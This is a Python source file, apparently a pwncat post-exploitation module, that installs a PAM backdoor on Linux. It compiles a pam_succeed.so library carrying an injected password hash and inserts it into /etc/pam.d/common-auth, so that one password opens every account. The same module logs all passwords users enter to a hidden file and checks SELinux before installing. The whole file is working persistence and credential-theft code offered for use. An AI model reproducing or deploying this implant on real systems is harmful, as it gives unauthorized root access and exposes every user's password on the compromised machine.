#!/usr/bin/env python3
import io
import hashlib

import pkg_resources
from pwncat.facts import Implant, CreatedFile
from pwncat.modules import Status, Argument, ModuleFailed
from pwncat.platform import PlatformError
from pwncat.platform.linux import Linux
from pwncat.modules.implant import ImplantModule


class PamImplant(Implant):
    def __init__(self, source, password, log, module_path, configs, line):
        super().__init__(source=source, uid=0, types=["implant.replace"])

        self.line = line
        self.module_path = module_path
        self.configs = configs
        self.password = password
        self.log = log

    def escalate(self, session: "pwncat.manager.Session"):
        """ Escalate to root with the pam implant """

        try:
            session.platform.su("root", password=self.password)
        except (PermissionError, PlatformError) as exc:
            raise ModuleFailed(str(exc)) from exc

    def remove(self, session: "pwncat.manager.Session"):
        """ Remove the installed implant """

        if session.current_user().id != 0:
            raise ModuleFailed("root permissions required to remove pam module")

        config_path = session.platform.Path("/etc/pam.d")

        # Remove the configuration files
        for config in self.configs:
            try:
                with (config_path / config).open("r") as filp:
                    contents = filp.readlines()
                with (config_path / config).open("w") as filp:
                    filp.writelines(line for line in contents if line != self.line)
            except (PermissionError, FileNotFoundError) as exc:
                continue

        # Remove the module
        try:
            session.platform.unlink(self.module_path)
        except FileNotFoundError:
            pass

        # Track the log file separately now
        session.register_fact(CreatedFile(self.source, 0, self.log))

    def title(self, session: "pwncat.manager.Session"):
        return f"""pam backdoor implant (logging to [cyan]{self.log}[/cyan])"""


class Module(ImplantModule):
    """
    Install a backdoor PAM module which allows authentication
    with a single password for all users. This PAM module does
    not interrupt authentication with correct user passwords.
    Further, it will log all entered passwords (except the
    backdoor password) to a log file which can be collected
    with the creds.pam enumeration module. The installed module
    will be named `pam_succeed.so`.
    """

    PLATFORM = [Linux]
    ARGUMENTS = {
        **ImplantModule.ARGUMENTS,
        "password": Argument(str, help="The password to use for the backdoor"),
        "log": Argument(
            str,
            default="/var/log/firstlog",
            help="Remote path to store logged user/password combinations",
        ),
    }

    def install(self, session: "pwncat.manager.Session", password, log):
        """ install the pam module """

        if session.current_user().id != 0:
            raise ModuleFailed("root permissions required to install pam module")

        if any(
            i.source == self.name
            for i in session.run("enumerate", types=["implant.replace"])
        ):
            raise ModuleFailed("only one pam implant may be installed at a time")

        yield Status("loading pam module source code")
        with open(pkg_resources.resource_filename("pwncat", "data/pam.c"), "r") as filp:
            sneaky_source = filp.read()

        yield Status("checking selinux state")
        for selinux in session.run("enumerate", types=["system.selinux"]):
            if selinux.enabled and "enforc" in selinux.mode:
                raise ModuleFailed("selinux enabled in enforce mode")
            elif selinux.enabled:
                session.log(
                    "[yellow]warning[/yellow]: selinux is enabled; implant will be logged!"
                )

        # Hash the backdoor password and prepare for source injection
        password_hash = ",".join(
            hex(c) for c in hashlib.sha1(password.encode("utf-8")).digest()
        )

        yield Status("patching module source code")

        # Inject password hash into source code
        sneaky_source = sneaky_source.replace("__PWNCAT_HASH__", password_hash)

        # Inject log path
        sneaky_source = sneaky_source.replace("__PWNCAT_LOG__", log)

        try:
            yield Status("compiling pam module")
            lib_path = session.platform.compile(
                [io.StringIO(sneaky_source)],
                suffix=".so",
                cflags=["-shared", "-fPIE"],
                ldflags=["-lcrypto"],
            )
        except (PlatformError, NotImplementedError) as exc:
            raise ModuleFailed(str(exc)) from exc

        try:
            yield Status("locating pam modules... ")
            result = session.platform.run(
                "find / -name pam_deny.so 2>/dev/null | grep -v 'snap/'",
                shell=True,
                capture_output=True,
                text=True,
                check=True,
            )
            pam_location = session.platform.Path(
                result.stdout.strip().split("\n")[0]
            ).parent
        except CalledProcessError as exc:
            try:
                session.platform.run(["rm", "-f", lib_path], check=True)
            except CalledProcessError:
                session.register_fact(
                    CreatedFile(source=self.name, uid=0, path=lib_path)
                )
            raise ModuleFailed("failed to locate pam installation location") from exc

        yield Status("copying pam module")
        session.platform.run(["mv", lib_path, str(pam_location / "pam_succeed.so")])

        added_line = "auth\tsufficient\tpam_succeed.so\n"
        modified_configs = []
        config_path = session.platform.Path("/", "etc", "pam.d")

        yield Status("patching pam configuration: ")
        for config in ["common-auth"]:
            yield Status(f"patching pam configuration: {config}")

            try:
                with (config_path / config).open("r") as filp:
                    content = filp.readlines()
            except (PermissionError, FileNotFoundError):
                continue

            contains_rootok = any("pam_rootok" in line for line in content)
            for i, line in enumerate(content):
                if "pam_rootok" in line:
                    content.insert(i + 1, added_line)
                    break
                elif line.startswith("auth"):
                    content.insert(i, added_line)
                    break
            else:
                content.append(added_line)

            try:
                with (config_path / config).open("w") as filp:
                    filp.writelines(content)
                modified_configs.append(config)
            except (PermissionError, FileNotFoundError):
                continue

        if not modified_configs:
            (pam_location / "pam_succeed.so").unlink()
            raise ModuleFailed("failed to add module to configuration")

        return PamImplant(
            self.name,
            password,
            log,
            str(pam_location / "pam_succeed.so"),
            modified_configs,
            added_line,
        )
